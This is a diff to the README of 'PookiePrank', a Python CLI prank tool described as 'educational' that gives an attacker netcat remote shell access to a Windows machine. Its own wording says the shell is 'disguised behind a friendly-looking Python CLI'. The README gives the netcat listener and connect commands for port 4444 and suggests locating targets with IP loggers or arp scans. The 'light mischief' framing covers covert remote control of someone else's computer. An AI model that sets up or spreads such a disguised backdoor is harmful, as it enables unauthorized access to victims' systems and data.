@@ -9,7 +9,7 @@ PLEASE READ THE FULL DOCUMENTATION FOR THE BETTER UNDERSTANDING OF THE PROJECT.
 **PookiePrank** is a lightweight "educational" program designed to demonstrate the importance of digital awareness through *strategic chaos*.  
 It's a prank tool wrapped in charm — **cute on the outside, spooky on the inside**.
 
-- Uses `Netcat` for remote shell access (with full user control)
+- Uses `netcat` for remote shell access (with full user control)
 - Disguised behind a friendly-looking Python CLI
 - A educational project that puts a Windows OS to vulnerability (and attacks eventually if not taken care of).
 - Perfect for ethical demos, cybersecurity training, and… *light mischief*.
@@ -48,7 +48,7 @@ This tool is designed to:
    ```bash
    nc64 -lvp 4444
    ```
-- The command attacjer needs to run in their machines.
+- The command attacker needs to run in their machines.
   - For Linux
     ```bash
     nc <ip_address_of _the_target_machine> 4444
@@ -56,7 +56,8 @@ This tool is designed to:
   - For Windows
     ```bash
     nc64 <ip_address_of _the_target_machine> 4444
-
+- For windows users, you can download `netcat` tool from the [here]{}
+- In Linux, the netcat comes preinstalled.
 NOTE:
 
 - You will need to know the target ip address beforehand. You can either use IP Loggers or do an `arp` scan over the local network.
